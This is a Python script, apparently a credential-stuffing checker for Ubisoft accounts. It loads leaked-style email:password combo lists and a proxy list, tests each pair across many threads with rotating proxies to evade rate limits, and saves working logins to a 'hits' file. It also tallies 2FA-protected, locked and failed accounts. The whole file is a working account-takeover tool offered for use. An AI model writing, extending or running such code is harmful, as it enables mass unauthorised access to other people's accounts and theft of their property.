import random, threading
from queue import Queue
from ubisoft import Ubisoft
from colorama import Fore, init
init(autoreset=True)

class tuffahhubisoft:
    def __init__(self):
        self.ubi = Ubisoft()
        self.accounts = Queue()
        self.proxies = []
        self.threads = 0

    def LoadFiles(self):
        with open("input/combo.txt", "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if line:
                    self.accounts.put(line)

        with open("input/proxies.txt", "r", encoding="utf-8") as f:
            self.proxies = [line.strip() for line in f if line.strip()]

    def getproxy(self):
        if not self.proxies:
            return None

        proxy = random.choice(self.proxies).strip()

        if "://" in proxy:
            return {
                "http": proxy,
                "https": proxy
            }
        
        return {
            "http": f"http://{proxy}",
            "https": f"http://{proxy}"
        }

    def worker(self):
        while not self.accounts.empty():
            try:
                combo = self.accounts.get_nowait()
            except:
                break

            try:
                email, password = combo.split(":", 1)
            except:
                continue

            proxy = self.getproxy()
            status, result = self.ubi.auth(email, password, proxy)

            if status == "ok":
                self.ubi.hits += 1
                print(Fore.GREEN + f"[HIT] {result}")
                with open("hits/hits.txt", "a", encoding="utf-8") as f:
                    f.write(result + "\n")

            elif status == "bad":
                self.ubi.bad += 1
                print(Fore.RED + f"[BAD] {email}:{password}")

            elif status == "2fa":
                self.ubi.tfa += 1
                print(Fore.LIGHTYELLOW_EX + f"[2FA] {email}:{password}")

            elif status == "locked":
                self.ubi.locked += 1
                print(Fore.MAGENTA + f"[LOCKED] {email}:{password}")

            elif status == "retry":
                self.ubi.retry += 1
                print(Fore.LIGHTYELLOW_EX + f"[RETRY] {email}:{password}")
                
            else:
                self.ubi.custom += 1
                print(Fore.CYAN + f"[CUSTOM] {email}:{password}")

            self.accounts.task_done()

    def run(self):
        threads = []

        for _ in range(self.threads):
            t = threading.Thread(target=self.worker)
            t.start()
            threads.append(t)

        for t in threads:
            t.join()

        print(f"HITS -> {self.ubi.hits} | BAD -> {self.ubi.bad} | 2FA -> {self.ubi.tfa} | LOCKED -> {self.ubi.locked} | RETRY -> {self.ubi.retry} | CUSTOM -> {self.ubi.custom}")

if __name__ == "__main__":
    tuff = tuffahhubisoft()
    try:
        tuff.threads = int(input("Threads > "))
    except:
        tuff.threads = 25

    tuff.LoadFiles()
    tuff.run()